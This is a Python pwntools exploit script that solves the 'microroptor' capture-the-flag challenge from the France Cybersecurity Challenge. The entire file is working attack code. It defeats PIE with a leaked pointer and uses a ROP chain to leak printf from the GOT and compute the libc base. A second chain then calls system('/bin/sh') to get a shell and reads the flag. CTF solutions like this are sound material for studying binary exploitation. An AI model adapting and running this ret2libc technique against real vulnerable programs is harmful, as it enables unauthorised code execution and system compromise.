#!/bin/python3
from pwn import *

BIN_NAME = "microroptor"
HOST_NAME= "challenges.france-cybersecurity-challenge.fr"
PORT = 2052

elf = context.binary = ELF(BIN_NAME)

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST_NAME,PORT)
    else:
        return process(elf.path)


### START & GET LEAK ###
io = start()
leak = int(io.recvline(),16)

### DEFEAT PIE ###
base = leak - 0x4010
main = base + 0x1178
puts_plt = base+elf.plt["puts"]

### GADGETS ###
POP_RDI = base + 0x116f
POP_RSI = base + 0x1249
RET = base + 0x1016

### libc = libc6_2.31-13_amd64 (https://libc.blukat.me/?q=read%3Ae80%2Cputs%3A5f0%2Cprintf%3Acf0&l=libc6-amd64_2.31-9_i386)
printf_offset = 0x056cf0
bin_sh_offset = 0x18a152
system_offset = 0x048e50

OFFSET = 40 #How many char to fill the buffer with until we can control RIP

### LOGGING ###
log.success(f"ptr leak: {hex(leak)}")
log.success(f"base found: {hex(base)}")
log.success(f"puts_plt found: {hex(puts_plt)}")
log.success(f"main found: {hex(main)}")

### LEAK LIBC ADRESSE ###
def leak(fun):
        fun_addr = base+elf.got[fun] #Get function address in the GOT
        log.info(f"Leaking {fun}.got libc adress")
        rop1 = [
            POP_RDI, fun_addr,
            puts_plt,
            main
        ]
        rop1 = b'A'*OFFSET+b''.join([p64(r) for r in rop1]) #Building first ropchain to leak a fun address
        io.sendline(rop1) #Send 1st ropchain
        io.recvline()
        leak_libc = io.recvline() #Receive leak
        leak_libc = leak_libc.strip().ljust(8,b'\x00') #Leak formatage
        log.progress(f"{fun}_libc: {hex(u64(leak_libc))}")
        return leak_libc #Return leak

libc_leak = u64(leak("printf")) #Get printf adresse in order to calculate libc base adress

libc_base = libc_leak - printf_offset #printf function in the binary - printf offset in the libc
BIN_SH = libc_base + bin_sh_offset
SYSTEM = libc_base + system_offset

#2nd ropchain, pass /bin/sh as system() argument to get a shell
rop2 = [
    POP_RDI, BIN_SH,
    RET,
    SYSTEM
]
rop2 = b'A'*OFFSET+ b''.join([p64(r) for r in rop2]) #Build 2nd ropchain to get a shell

io.sendline(rop2) #Send 2nd ropchain
io.recvline()
io.recvline()
io.sendline(b"cat flag") #Get the flag
print(io.recvline()) #Print the flag
